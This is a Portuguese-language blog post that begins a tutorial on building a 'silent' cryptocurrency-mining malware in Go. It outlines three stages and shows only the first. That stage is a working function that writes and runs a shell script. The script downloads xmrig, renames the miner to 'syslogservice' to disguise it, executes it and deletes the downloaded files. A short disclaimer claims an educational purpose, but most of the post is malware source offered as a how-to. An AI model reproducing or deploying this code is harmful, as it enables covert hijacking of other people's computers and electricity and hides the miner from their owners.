---
layout: post
title:  "Building a silent mining malware"
date:   2022-08-10 01:51:18 -0300
categories: ["Cyber Security"]

---
Com a popularidade das crypto moedas investir em mineração certamente foi algo que passou pela cabeça de muitas pessoas, mas os altos custos de hardware e de energia fez com que fosse inviável ou não rentável para muitas pessoas. Mas e se você pudesse apenas receber os lucros da mineração, sem se preocupar com os gastos em hardware e energia, e além disso usar centenas ou milhares de computadores para isso? Foi isso que motivou cyber criminosos a criar botnets com várias maquinas infectadas com esse malware minerador.

## Disclaimer
Esse artigo foi escrito únicamente para fins de aprendizados para entusiastas ou profissionais de cybersegurança, não me responsabilizo pelo uso indevido do conhecimento adquirido aqui.

<!-- Esse malware sera criado usando Go porque é uma linguagem simples e compilada. -->
## Code
Nosso malware vai funcionar em 3 etapas:
1. Baixar e configurar o xmrig e excluir os arquivos gerados.
2. Criar persistência na máquina.
3. Encontrar e remover outros mineradores na máquina infectada.


### Etapa 1
Primeiramente temos que pegar a url de download do minerador, podemos encontrar facilmente no próprio repositório do xmrig.a
![](../assets/images/xmrig_github.png)
```go
func getMiner() {
	minerLink := "https://github.com/xmrig/xmrig/releases/download/v6.16.3/xmrig-6.16.3-linux-static-x64.tar.gz"

	payload := "wget " + minerLink + "; curl -L " + minerLink + "; tar -zvxf xmrig-6.16.3-linux-static-x64.tar.gz; mv config.json xmrig-6.16.3; cd xmrig-6.16.3; mv xmrig syslogservice; ./syslogservice; pid=$!; wait $pid; cd ..; rm xmrig-6.16.3-linux-static-x64.tar.gz; pid=$!; wait $pid; rm -R xmrig-6.16.3; pid=$!; wait $pid; rm k4ynv2;"

	data := []byte(payload)

	ioutil.WriteFile("k4yn.sh", data, 0644)

	exec.Command("chmod", "777", "k4yn.sh").Output()
	exec.Command("chmod", "+x", "k4yn.sh").Output()
	exec.Command("/bin/sh", "k4yn.sh").Output()
}
```